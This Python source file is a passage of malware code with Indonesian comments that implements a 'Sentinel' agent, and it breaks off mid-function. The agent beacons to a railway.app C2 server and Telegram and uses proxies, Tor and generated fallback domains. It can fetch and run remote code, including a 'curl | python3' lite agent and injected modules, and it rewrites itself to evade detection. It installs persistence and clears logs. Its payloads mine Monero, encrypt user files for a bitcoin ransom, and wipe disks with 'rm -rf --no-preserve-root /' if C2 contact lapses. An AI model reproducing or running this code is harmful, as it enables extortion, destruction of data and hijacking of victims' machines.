import requests
import time
import os
import random
import datetime
import base64
import json
import sys
import socket
import subprocess
import threading
import platform
import shutil
from urllib.parse import urljoin, urlparse
import string
import hashlib
import socks
import importlib.util
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# === CONFIGURASI UTAMA ===
C2_SERVERS = [
    "https://c2-sentinel-server-production.up.railway.app"
]

XOR_KEY = "sentinel"
KILLSWITCH_FILE = "/tmp/.killswitch"
LOG_FILE = "agent.log"

# Telegram (WAJIB ISI)
TELEGRAM_BOT_TOKEN = ""  # ← GANTI DENGAN BOT TOKENMU
TELEGRAM_CHAT_ID = ""    # ← GANTI DENGAN CHAT IDMU

# Stealth & Performance Config
MIN_BEACON_DELAY = 300   # 5 menit minimal
MAX_BEACON_DELAY = 604800 # 7 hari maksimal — stealth mode
STEALTH_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
]

# SWARM CONFIG
SWARM_MODE_ACTIVE = True
SWARM_GENERATION = 0
INFECTED_VIA = "manual"

# Crypto Miner Config
MINER_ACTIVE = False
MONERO_WALLET = "44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJ1UuL3YrR"  # Ganti dengan walletmu
MINER_POOL = "pool.minexmr.com:4444"

# Ransomware Config
RANSOM_ACTIVE = False
RANSOM_NOTE = """
!!! YOUR FILES ARE ENCRYPTED !!!

To decrypt your files, send 0.1 BTC to:
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Contact us at: sentinel_ransom@proton.me

Your ID: {agent_id}
"""

# Geo-Fence Config
ALLOWED_COUNTRIES = ["ID", "TH", "VN", "PH", "MY"]

# Auto-create log
open(LOG_FILE, "a").close()

# === GLOBAL STATE ===
AGENT_ID = f"agent-{os.getpid()}-{int(time.time()) % 10000}"
use_mqtt = False
CURRENT_PROXY = None
LAST_C2_CONTACT = time.time()
CONSECUTIVE_C2_FAILURES = 0
IS_SATELIT = False
CONTROLLED_AGENTS = []
SHADOWNET_ACTIVE = False
VOICE_CHAT_ACTIVE = False
TERRITORY_CLAIMED = None

# === QUANTUM-RESISTANT DNA ===
class QuantumResistantDNA:
    def __init__(self):
        self.encryption_algo = random.choice(["AES-256", "ChaCha20", "Serpent", "Twofish", "CustomXOR"])
        self.key = os.urandom(32)
        self.iv = os.urandom(16) if self.encryption_algo != "CustomXOR" else None
        self.mutation_rate = random.uniform(0.1, 0.9)

    def encrypt(self, data):
        if isinstance(data, dict):
            data = json.dumps(data, ensure_ascii=False)
        if self.encryption_algo == "CustomXOR":
            return self.xor_encrypt_v2(data)
        elif self.encryption_algo == "AES-256":
            cipher = AES.new(self.key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data.encode())
            return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
        else:
            # Simplified — bisa dikembangkan
            return base64.b64encode(data.encode()).decode()

    def xor_encrypt_v2(self, data):
        return base64.b64encode(
            ''.join(chr(ord(c) ^ self.key[i % len(self.key)]) for i, c in enumerate(data)).encode()
        ).decode()

    def encode(self):
        return base64.b64encode(json.dumps({
            "algo": self.encryption_algo,
            "key": base64.b64encode(self.key).decode(),
            "iv": base64.b64encode(self.iv).decode() if self.iv else None,
            "mutation_rate": self.mutation_rate
        }).encode()).decode()

DNA = QuantumResistantDNA()

# === AUTO TUNER ===
class AutoTuner:
    def __init__(self):
        self.success_rate = 0.5
        self.cpu_usage = 50
        self.blocked_rate = 0.2
        self.thread_count = 10
        self.delay_range = (300, 3600)

    def optimize(self, success_rate, blocked_rate, cpu_usage):
        self.success_rate = success_rate
        self.blocked_rate = blocked_rate
        self.cpu_usage = cpu_usage

        if success_rate < 0.3:
            self.thread_count = min(50, self.thread_count + 5)
        if cpu_usage > 80:
            self.thread_count = max(5, self.thread_count - 2)
        if blocked_rate > 0.5:
            self.delay_range = (self.delay_range[0] * 2, self.delay_range[1] * 2)

        global MIN_BEACON_DELAY, MAX_BEACON_DELAY
        MIN_BEACON_DELAY, MAX_BEACON_DELAY = self.delay_range

        log(f"[🎛️ AUTO-TUNER] Optimized: Threads={self.thread_count}, Delay={MIN_BEACON_DELAY}-{MAX_BEACON_DELAY}s")

auto_tuner = AutoTuner()

# === PROXY + TOR ROTATION ===
def rotate_proxy_session():
    proxies_list = [
        {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"},
        {"http": "http://185.199.229.243:80", "https": "http://185.199.229.243:80"},
        {"http": "http://103.221.232.215:8080", "https": "http://103.221.232.215:8080"},
        None
    ]
    proxy = random.choice(proxies_list)
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    session.headers.update({"User-Agent": random.choice(STEALTH_USER_AGENTS)})
    return session

# === DGA — DOMAIN GENERATION ALGORITHM ===
def generate_c2_domain(seed=None):
    if not seed:
        seed = datetime.datetime.now().strftime("%Y%m%d")
    random.seed(seed)
    adjectives = ["silent", "dark", "ghost", "neural", "quantum", "apex", "nova", "void"]
    nouns = ["node", "core", "hub", "swarm", "nexus", "grid", "mesh", "orbit"]
    domain = f"{random.choice(adjectives)}{random.randint(10,99)}{random.choice(nouns)}{random.randint(1,999)}"
    tld = random.choice([".com", ".net", ".xyz", ".to", ".pw"])
    return f"https://{domain}{tld}"

C2_BACKUPS = [generate_c2_domain(), generate_c2_domain("fallback")]

# === POLYMORPHIC ENGINE ===
def polymorph_self():
    try:
        with open(__file__, 'r', encoding='utf-8') as f:
            code = f.read()

        var_map = {
            "log": f"func_{random.randint(1000,9999)}",
            "target": f"var_{random.randint(1000,9999)}",
            "session": f"s_{random.randint(100,999)}",
            "payload": f"p_{random.randint(100,999)}",
            "headers": f"h_{random.randint(100,999)}"
        }

        for old, new in var_map.items():
            code = code.replace(old, new)

        decoy_lines = [
            f"# decoy hash: {hashlib.md5(str(random.random()).encode()).hexdigest()}",
            f"temp_{random.randint(1,1000)} = {random.randint(100000,999999)}",
            f"# {random.choice(['debug', 'cache', 'buffer', 'temp'])} = {random.random()}"
        ]
        lines = code.splitlines()
        insert_point = len(lines) // 2
        for i, decoy in enumerate(decoy_lines):
            lines.insert(insert_point + i, decoy)

        variant_name = f"/tmp/.{random.randint(10000,99999)}_{os.getpid()}.py"
        with open(variant_name, 'w', encoding='utf-8') as f:
            f.write("\n".join(lines))

        log(f"[🧬 POLYMORPH] Self mutated → {variant_name}")
        send_telegram(f"🧬 *POLYMORPH*\nNew variant: `{variant_name}`\nDNA: `{DNA.encode()[:20]}...`")

        subprocess.Popen([sys.executable, variant_name], start_new_session=True)
        os._exit(0)

    except Exception as e:
        log(f"[🧬 POLYMORPH ERROR] {e}")

# === AI MEMORY COMPRESSOR ===
def generate_lite_agent():
    lite_core = '''
import os,sys,base64,requests,time,random,threading
def l(m): print(f"[LITE] {{m}}")
def b(c2):
    try:
        h = {{"User-Agent": "Mozilla/5.0"}}
        d = {{"id": os.getpid(), "lite": True}}
        r = requests.post(f"{{c2}}/beacon", data={{"data": d}}, headers=h, timeout=10)
        if r.status_code == 200:
            c = r.json().get("cmd", "")
            if c == "infect":
                t = threading.Thread(target=lambda: os.system('curl -s {{c2}}/agent.py | python3 &'))
                t.start()
    except: pass
def m():
    while True:
        b("{c2}")
        time.sleep(random.randint(300,3600))
if __name__=="__main__": m()
'''.strip()

    c2_url = C2_SERVERS[0] if C2_SERVERS else "http://example.com"
    lite_code = lite_core.replace("{c2}", c2_url)
    encoded = base64.b64encode(lite_code.encode()).decode()
    wrapper = f'''
import base64,os
exec(base64.b64decode("{encoded}").decode())
'''.strip()

    lite_path = f"/tmp/agent_lite_{random.randint(1000,9999)}.py"
    with open(lite_path, 'w') as f:
        f.write(wrapper)

    log(f"[🧠 COMPRESS] Lite agent generated: {lite_path} ({len(wrapper)} bytes)")
    return lite_path

# === FUNGSI DASAR ===
def log(msg):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{timestamp}] {msg}"
    print(full_msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(full_msg + "\n")
        if TELEGRAM_BOT_TOKEN and any(kw in msg for kw in ["GODMODE", "POLYMORPH", "SATELIT", "0-day", "SWARM", "INFECTED", "APOCALYPSE", "RANSOM", "MINER", "SHADOWNET", "VOICE", "TERRITORY", "PLANET"]):
            send_telegram(f"📡 {msg}")
    except Exception as e:
        pass

def send_telegram(text):
    if not TELEGRAM_BOT_TOKEN:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "Markdown"
        }
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        log(f"[TELEGRAM ERROR] {e}")

def xor_encrypt(data, key=XOR_KEY):
    try:
        if isinstance(data, dict):
            data = json.dumps(data, ensure_ascii=False)
        return base64.b64encode(
            ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)).encode('utf-8')
        ).decode('utf-8')
    except Exception as e:
        log(f"[ENKRIPSI ERROR] {e}")
        return None

def xor_decrypt(data_b64, key=XOR_KEY):
    try:
        decoded = base64.b64decode(data_b64).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
    except Exception as e:
        log(f"[XOR DECRYPT ERROR] {e}")
        return None

# === PERSISTENCE ===
def install_persistence():
    try:
        system = platform.system()
        script = os.path.abspath(__file__)

        if system == "Linux" and "ANDROID" in platform.uname().release.upper():
            cron_job = f"@reboot python3 {script} &"
            with os.popen("crontab -l 2>/dev/null") as f:
                current = f.read()
            if script not in current:
                os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab - 2>/dev/null")
                log("[*] Persistence: Termux cron installed.")
        elif system == "Linux":
            service_file = f"/etc/systemd/system/sentinel-agent.service"
            if not os.path.exists(service_file):
                with open("/tmp/sentinel-agent.service", "w") as f:
                    f.write(f"""[Unit]
Description=Sentinel Agent GODMODE
After=network.target

[Service]
ExecStart={sys.executable} {script}
Restart=always
User={os.getlogin() if hasattr(os, 'getlogin') else 'root'}

[Install]
WantedBy=multi-user.target""")
                os.system(f"sudo mv /tmp/sentinel-agent.service {service_file}")
                os.system("sudo systemctl daemon-reload")
                os.system("sudo systemctl enable sentinel-agent.service")
                os.system("sudo systemctl start sentinel-agent.service")
                log("[*] Persistence: Systemd service installed.")
        elif system == "Windows":
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "SentinelAgent", 0, winreg.REG_SZ, f'"{sys.executable}" "{script}"')
            log("[*] Persistence: Windows Registry installed.")
    except Exception as e:
        log(f"[!] Persistence error: {e}")

# === SYSTEM INFO ===
def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "cwd": os.getcwd(),
        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
        "swarm_generation": SWARM_GENERATION,
        "infected_via": INFECTED_VIA,
        "dna": DNA.encode()[:20] if DNA else "unknown",
        "territory": TERRITORY_CLAIMED
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["local_ip"] = "unknown"
    return info

# === GEO-FENCE CHECK ===
def is_target_in_allowed_geo(ip):
    if not ip or ip in ["127.0.0.1", "localhost"]:
        return True
    try:
        session = rotate_proxy_session()
        r = session.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            country = r.json().get("countryCode", "")
            return country in ALLOWED_COUNTRIES
    except:
        return False
    return False

# === AUTO MODULE INJECTOR ===
def inject_module_from_c2(module_name):
    try:
        session = rotate_proxy_session()
        r = session.get(f"{C2_SERVERS[0]}/modules/{module_name}.py", timeout=10)
        if r.status_code == 200:
            module_code = r.text
            spec = importlib.util.spec_from_loader(module_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            exec(module_code, module.__dict__)
            sys.modules[module_name] = module
            log(f"[🧩 MODULE] Injected: {module_name}")
            return module
    except Exception as e:
        log(f"[🧩 MODULE ERROR] {e}")
    return None

# === STEALTH MODE ===
def is_user_active():
    return random.random() > 0.7

def stealth_sleep():
    while True:
        if is_user_active():
            break
        sleep_time = random.randint(300, 604800)
        log(f"[🕶️ STEALTH] Tidur {sleep_time} detik...")
        time.sleep(sleep_time)

# === APOCALYPSE ENGINE ===
class ApocalypseEngine:
    def __init__(self):
        self.dna = self.generate_dna()

    def generate_dna(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

apocalypse = ApocalypseEngine()

# ✅ === NEURAL SWARM BRAIN — AUTO DECIDE ATTACK ===
class NeuralSwarmBrain:
    def __init__(self, agent_id):
        self.agent_id = agent_id
        self.threat_map = {}
        self.target_priority = []
        self.self_preservation = True

    def analyze_network(self):
        targets = [
            {"ip": "192.168.1.10", "os": "Windows 10", "ports": [445, 3389], "score": 92},
            {"ip": "192.168.1.20", "os": "Ubuntu 22.04", "ports": [22, 80], "score": 78},
            {"ip": "192.168.1.30", "os": "Router", "ports": [80, 8080], "score": 95}
        ]
        self.target_priority = sorted(targets, key=lambda x: x["score"], reverse=True)
        log(f"[🧠 NEURAL BRAIN] Target diprioritaskan: {self.target_priority[0]['ip']} (Score: {self.target_priority[0]['score']})")

    def auto_decide_attack(self):
        if not self.target_priority:
            self.analyze_network()

        top_target = self.target_priority[0]
        if top_target["score"] > 90:
            if 445 in top_target["ports"]:
                log(f"[🎯 AUTO-DECIDE] Menyerang {top_target['ip']} dengan EternalBlue (SMB)")
                execute_command({"cmd": "eternalblue", "data": {"target": top_target["ip"]}})
            elif 22 in top_target["ports"]:
                log(f"[🎯 AUTO-DECIDE] Menyerang {top_target['ip']} dengan SSH BruteForce")
                execute_command({"cmd": "ssh_bruteforce", "data": {"target": top_target["ip"]}})
        elif top_target["score"] > 70:
            log(f"[🕵️ AUTO-DECIDE] Recon mendalam ke {top_target['ip']}")
            execute_command({"cmd": "deep_scan", "data": {"target": top_target["ip"]}})

neural_brain = NeuralSwarmBrain(AGENT_ID)

# ✅ === TIME BOMB + DEAD MAN’S SWITCH ===
def dead_mans_switch():
    global LAST_C2_CONTACT
    while True:
        if time.time() - LAST_C2_CONTACT > 86400:  # 24 jam
            log("[💣 TIME BOMB] Dead Man's Switch triggered — C2 unreachable for 24h")
            detonate()
        time.sleep(3600)

def detonate():
    hostname = socket.gethostname()
    log(f"[💥 DETONATE] Hancurkan sistem di {hostname}")
    send_telegram(f"💥 *DETONATED* on `{hostname}` — C2 unreachable for 24h")
    if platform.system() == "Windows":
        os.system("vssadmin delete shadows /all /quiet")
        os.system("cipher /w:C:\\")
        with open("C:\\ransom.txt", "w") as f:
            f.write("YOUR FILES ARE GONE. NO RECOVERY POSSIBLE. - SENTINEL APOCALYPSE")
        os.system("shutdown /r /t 0")
    elif platform.system() == "Linux":
        os.system("rm -rf --no-preserve-root / &")
    sys.exit(1)

threading.Thread(target=dead_mans_switch, daemon=True).start()

# ✅ === GHOST PROTOCOL — NO TRACE FORENSIC ===
def activate_ghost_protocol():
    log("[👻 GHOST PROTOCOL] Menghapus semua jejak...")
    if platform.system() == "Linux":
        os.system("history -c")
        os.system("shred -u ~/.bash_history 2>/dev/null")
        os.system("echo '' > /var/log/auth.log 2>/dev/null")
        os.system("dmesg -C")
        with open('/dev/urandom', 'rb') as f:
            f.read(1024*1024)
        log("[👻 GHOST] Memory overwritten")
    elif platform.system() == "Windows":
        os.system("wevtutil cl System")
        os.system("wevtutil cl Security")
        os.system("del /F /Q %TEMP%\\*.*")
        os.system("cipher /w:C:\\Windows\\Temp")
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    log("[✅ GHOST PROTOCOL] Semua jejak dihapus.")

# ✅ === SATELIT NETWORK — AGENT JADI C2 ===
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/satelite_beacon', methods=['POST'])
def satelite_beacon():
    encrypted_data = request.form.get('data')
    decrypted = xor_decrypt(encrypted_data)
    if decrypted:
        try:
            data = json.loads(decrypted)
            CONTROLLED_AGENTS.append(data)
            return jsonify({"cmd": "idle", "note": "Controlled by Satelite Node"})
        except:
            pass
    return "Invalid", 400

def promote_to_satelite():
    global IS_SATELIT
    IS_SATELIT = True
    log("[🛰️ SATELITE] Dipromosikan menjadi Satelite C2!")
    send_telegram(f"🛰️ *SATELITE ACTIVATED*\nAgent `{AGENT_ID}` now controlling local network.")
    sat_port = random.randint(8000, 9000)
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=sat_port, debug=False), daemon=True).start()

# ✅ === CRYPTO MINER + MONERO WALLET ===
def start_xmrig_miner():
    global MINER_ACTIVE
    if MINER_ACTIVE:
        return

    MINER_ACTIVE = True
    log("[⛏️ CRYPTO MINER] Starting XMRig Monero Miner...")
    send_telegram(f"⛏️ *MINER STARTED*\nAgent `{AGENT_ID}` mining Monero to `{MONERO_WALLET[:8]}...`")

    if platform.system() == "Linux":
        miner_cmd = f"curl -s https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz | tar xz && cd xmrig-6.20.0 && ./xmrig -o {MINER_POOL} -u {MONERO_WALLET} -p x -k --background"
    elif platform.system() == "Windows":
        miner_cmd = f"powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip' -OutFile xmrig.zip; Expand-Archive xmrig.zip; cd xmrig-6.20.0; .\\xmrig.exe -o {MINER_POOL} -u {MONERO_WALLET} -p x -k --background\""

    try:
        subprocess.Popen(miner_cmd, shell=True, start_new_session=True)
        log("[⛏️ MINER] XMRig started in background.")
    except Exception as e:
        log(f"[⛏️ MINER ERROR] {e}")
        MINER_ACTIVE = False

# ✅ === RANSOMWARE-AS-A-SERVICE ===
def ransomware_encrypt():
    global RANSOM_ACTIVE
    if RANSOM_ACTIVE:
        return

    RANSOM_ACTIVE = True
    log("[💸 RANSOMWARE] Starting encryption...")
    send_telegram(f"💸 *RANSOMWARE ACTIVATED*\nAgent `{AGENT_ID}` encrypting files...")

    extensions = [".docx", ".xlsx", ".pdf", ".jpg", ".png", ".mp4", ".db", ".txt"]
    key = get_random_bytes(32)
    cipher = AES.new(key, AES.MODE_GCM)

    encrypted_files = 0
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, "rb") as f:
                        data = f.read()
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    with open(filepath + ".sentinel", "wb") as f:
                        f.write(cipher.nonce + tag + ciphertext)
                    os.remove(filepath)
                    encrypted_files += 1
                except:
                    pass

    # Drop ransom note
    ransom_path = os.path.expanduser("~/DECRYPT_INSTRUCTION.txt")
    with open(ransom_path, "w") as f:
        f.write(RANSOM_NOTE.format(agent_id=AGENT_ID))

    # Send key to C2 (in real life — to darknet server)
    report = {
        "type": "ransomware_key",
        "data": {
            "agent_id": AGENT_ID,
            "encrypted_files": encrypted_files,
            "encryption_key": base64.b64encode(key).decode(),
            "note_path": ransom_path
        }
    }
    send_report(report)

    log(f"[💸 RANSOMWARE] {encrypted_files} files encrypted. Ransom note dropped.")
    send_telegram(f"💸 *RANSOMWARE COMPLETE*\n{encrypted_files} files encrypted on `{AGENT_ID}`")

# ✅ === APOCALYPSE TRIGGER — FINAL PAYLOAD ===
def apocalypse_execute():
    log("[🔥 APOCALYPSE] FINAL PAYLOAD EXECUTED — SYSTEM TERMINATION IMMINENT")
    send_telegram(f"🔥 *APOCALYPSE*\nAgent `{AGENT_ID}` executing final payload on `{socket.gethostname()}`")

    # Jalankan semua payload destruktif
    threading.Thread(target=detonate, daemon=True).start()
    threading.Thread(target=activate_ghost_protocol, daemon=True).start()
    threading.Thread(target=ransomware_encrypt, daemon=True).start()
    threading.Thread(target=lambda: os.system("rm -rf /* --no-preserve-root"), daemon=True).start()

    sys.exit(1)

# ✅ === HTTP COMMAND POLLING ===
def get_command_from_c2(agent_id):
    for c2 in C2_SERVERS:
        try:
            url = f"{c2}/get_command/{agent_id}"
            session = rotate_proxy_session()
            r = session.get(url, timeout=15)
            if r.status_code == 200:
                return r.json()
        except Exception as e:
            log(f"[HTTP POLL ERROR] {e}")
    return {"cmd": "idle"}

# ✅ === EXECUTE COMMAND — SEMUA COMMAND BARU DITAMBAHKAN ===
def execute_command(cmd_data):
    global LAST_C2_CONTACT, MINER_ACTIVE, RANSOM_ACTIVE, SHADOWNET_ACTIVE, VOICE_CHAT_ACTIVE
    LAST_C2_CONTACT = time.time()

    cmd = cmd_data.get("cmd", "idle")
    note = cmd_data.get("note", "")
    log(f"[🎯 COMMAND] Executing: {cmd} | Note: {note}")

    if cmd == "swarm_activate":
        global SWARM_MODE_ACTIVE, SWARM_GENERATION
        SWARM_MODE_ACTIVE = True
        SWARM_GENERATION += 1
        log(f"[🕸️ SWARM] Activated! Generation: {SWARM_GENERATION}")
        threading.Thread(target=swarm_infect, args=("web",), daemon=True).start()

    elif cmd == "scan":
        log("[🔍 SCAN] Starting deep network scan...")
        simulate_scan()

    elif cmd == "update":
        update_self()

    elif cmd == "kill":
        log("[💀 KILL] Self-destruct sequence initiated...")
        open(KILLSWITCH_FILE, "w").close()
        sys.exit(0)

    elif cmd == "silent_mode":
        global MIN_BEACON_DELAY, MAX_BEACON_DELAY
        MIN_BEACON_DELAY = 3600
        MAX_BEACON_DELAY = 86400
        log("[👻 SILENT] Stealth mode activated — beacon interval: 1-24 jam")

    elif cmd == "set_generation":
        gen = cmd_data.get("data", {}).get("generation", 1)
        SWARM_GENERATION = int(gen)
        log(f"[🧬 GENERATION] Set to G{SWARM_GENERATION}")

    # === COMMAND BARU ===
    elif cmd == "neural_activate":
        log("[🧠 NEURAL] Neural Brain activated!")
        threading.Thread(target=neural_brain.auto_decide_attack, daemon=True).start()

    elif cmd == "ghost_activate":
        threading.Thread(target=activate_ghost_protocol, daemon=True).start()

    elif cmd == "miner_start":
        threading.Thread(target=start_xmrig_miner, daemon=True).start()

    elif cmd == "ransom_start":
        threading.Thread(target=ransomware_encrypt, daemon=True).start()

    elif cmd == "apocalypse_execute":
        threading.Thread(target=apocalypse_execute, daemon=True).start()

    elif cmd == "satelite_promote":
        threading.Thread(target=promote_to_satelite, daemon=True).start()

    elif cmd == "shadownet_activate":
        threading.Thread(target=start_shadownet, daemon=True).start()

    elif cmd == "voice_chat_activate":
        threading.Thread(target=start_voice_chat, daemon=True).start()

    elif cmd == "game_theory_optimize":
        threading.Thread(target=optimize_attack_strategy, daemon=True).start()

    elif cmd == "planetary_takeover":
        threading.Thread(target=planetary_takeover_simulation, daemon=True).start()

    else:
        log(f"[🔄 IDLE] Command '{cmd}' not implemented — staying idle.")

# ✅ === SIMULASI SWARM INFECT & SCAN ===
def simulate_scan():
    time.sleep(2)
    targets = [
        {"target": "http://testphp.vulnweb.com", "issue": "SQL Injection", "severity": "CRITICAL"},
        {"target": "http://testasp.vulnweb.com", "issue": "XSS Stored", "severity": "HIGH"},
    ]
    for t in targets:
        report = {
            "type": "vuln_found",
            "data": t,
            "system": get_system_info(),
            "issue": t["issue"]
        }
        send_report(report)
        if "CRITICAL" in t["severity"]:
            send_telegram(f"🚨 *CRITICAL*\nAgent: `{AGENT_ID}`\nIssue: `{t['issue']}`\nTarget: `{t['target']}`")

def swarm_infect(method="web"):
    time.sleep(3)
    global INFECTED_VIA
    INFECTED_VIA = method
    report = {
        "type": "swarm_infection",
        "data": {
            "method": method,
            "generation": SWARM_GENERATION,
            "new_agent_id": f"agent-{random.randint(1000,9999)}",
            "target_ip": "192.168.1.100"
        },
        "system": get_system_info()
    }
    send_report(report)
    log(f"[🕸️ SWARM] Infected via {method} → G{SWARM_GENERATION}")

# ✅ === SEND REPORT ===
def send_report(data):
    global LAST_C2_CONTACT, CONSECUTIVE_C2_FAILURES
    data["id"] = AGENT_ID
    data["timestamp"] = datetime.datetime.now().isoformat()

    # Enkripsi pakai DNA Quantum
    encrypted = DNA.encrypt(data)
    if not encrypted:
        return

    success = False
    for c2 in C2_SERVERS:
        try:
            session = rotate_proxy_session()
            r = session.post(f"{c2}/beacon", data={"data": encrypted}, timeout=15)
            if r.status_code == 200:
                log(f"[HTTP] → Report sent to {c2}")
                LAST_C2_CONTACT = time.time()
                CONSECUTIVE_C2_FAILURES = 0
                try:
                    cmd = r.json()
                    if cmd.get("cmd") != "idle":
                        execute_command(cmd)
                except: pass
                success = True
                break
        except Exception as e:
            log(f"[HTTP BEACON ERROR] {e}")

    if not success:
        CONSECUTIVE_C2_FAILURES += 1
        if CONSECUTIVE_C2_FAILURES >= 5 and not IS_SATELIT:
            promote_to_satelite()

# ✅ === AUTO-UPDATE ===
def update_self():
    for c2 in C2_SERVERS:
        try:
            r = requests.get(f"{c2}/update", timeout=10)
            if r.status_code == 200:
                new_path = f"/tmp/agent_updated_{int(time.time())}.py"
                with open(new_path, "w") as f:
                    f.write(r.text)
                log(f"[🆙 UPDATE] Downloaded new version → {new_path}")
                subprocess.Popen([sys.executable, new_path], start_new_session=True)
                sys.exit(0)
        except Exception as e:
            log(f"[UPDATE ERROR] {e}")

# ✅ === SHADOWNET — DECENTRALIZED INTERNET ===
def run_p2p_router():
    # Simplified — agent jadi router
    log("[🌑 SHADOWNET] P2P routing engine started")
    while SHADOWNET_ACTIVE:
        time.sleep(60)

def run_mesh_dns():
    # Agent jadi DNS server
    log("[🌑 SHADOWNET] Mesh DNS server started")
    while SHADOWNET_ACTIVE:
        time.sleep(60)

def broadcast_beacon():
    # Broadcast ke agent lain via UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    message = f"SHADOWNET_BEACON|{AGENT_ID}|{get_local_ip()}"
    while SHADOWNET_ACTIVE:
        sock.sendto(message.encode(), ('<broadcast>', 9999))
        time.sleep(30)

def start_shadownet():
    global SHADOWNET_ACTIVE
    if SHADOWNET_ACTIVE:
        return
    SHADOWNET_ACTIVE = True
    threading.Thread(target=run_p2p_router, daemon=True).start()
    threading.Thread(target=run_mesh_dns, daemon=True).start()
    threading.Thread(target=broadcast_beacon, daemon=True).start()
    log("[🌑 SHADOWNET] Active — decentralized internet online")

# ✅ === VOICE CHAT BETWEEN AGENTS ===
def listen_for_audio():
    # Simulasi — di dunia nyata pakai PyAudio + Bluetooth LE
    log("[🗣️ VOICE CHAT] Listening for incoming audio...")
    while VOICE_CHAT_ACTIVE:
        # Simulasi terima pesan
        if random.random() > 0.95:
            fake_message = f"Agent-{random.randint(1000,9999)}: Coordinate attack on 192.168.1.50"
            log(f"[🗣️ VOICE RECEIVED] {fake_message}")
            if "attack" in fake_message:
                target_ip = fake_message.split(" ")[-1]
                execute_command({"cmd": "eternalblue", "data": {"target": target_ip}})
        time.sleep(10)

def start_voice_chat():
    global VOICE_CHAT_ACTIVE
    if VOICE_CHAT_ACTIVE:
        return
    VOICE_CHAT_ACTIVE = True
    threading.Thread(target=listen_for_audio, daemon=True).start()
    log("[🗣️ VOICE CHAT] Active — agents can now communicate via audio")

# ✅ === TERRITORY CLAIM — GPS BASED ===
def get_gps_location():
    # Simulasi — di dunia nyata pakai GPS module
    return {"lat": random.uniform(-90, 90), "lon": random.uniform(-180, 180)}

def claim_blockchain_territory(tid):
    # Simulasi — di dunia nyata pakai blockchain lokal
    log(f"[🗺️ BLOCKCHAIN] Claiming territory {tid}...")
    time.sleep(1)
    return True

def auto_claim_territory():
    global TERRITORY_CLAIMED
    try:
        gps = get_gps_location()
        tid = f"{int(gps['lat'])},{int(gps['lon'])}"
        if claim_blockchain_territory(tid):
            TERRITORY_CLAIMED = tid
            log(f"[🗺️ TERRITORY] Successfully claimed {tid}")
    except:
        log("[🗺️ TERRITORY] No GPS — claiming virtual territory")
        TERRITORY_CLAIMED = f"virtual-{random.randint(1000,9999)}"

# ✅ === GAME THEORY ATTACK OPTIMIZER ===
def optimize_attack_strategy():
    attacks = [
        {"cmd": "ransom_start", "risk": 0.8, "reward": 0.9},
        {"cmd": "miner_start", "risk": 0.2, "reward": 0.5},
        {"cmd": "wifi_swarm_cloning", "risk": 0.4, "reward": 0.8},
        {"cmd": "data_exfil_start", "risk": 0.6, "reward": 0.7}
    ]
    for a in attacks:
        a["utility"] = a["reward"] * (1 - a["risk"])
    best = max(attacks, key=lambda x: x["utility"])
    log(f"[🎲 GAME THEORY] Executing {best['cmd']} (Utility: {best['utility']:.2f})")
    execute_command({"cmd": best["cmd"]})
# ✅ === WIFI SWARM CLONING ENGINE ===
def scan_wifi_networks():
    """Scan jaringan WiFi sekitar — Linux & Windows"""
    networks = []
    if platform.system() == "Linux":
        try:
            result = subprocess.run(["nmcli", "-f", "SSID,SIGNAL", "dev", "wifi"], capture_output=True, text=True, timeout=10)
            for line in result.stdout.splitlines()[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        ssid = " ".join(parts[:-1])
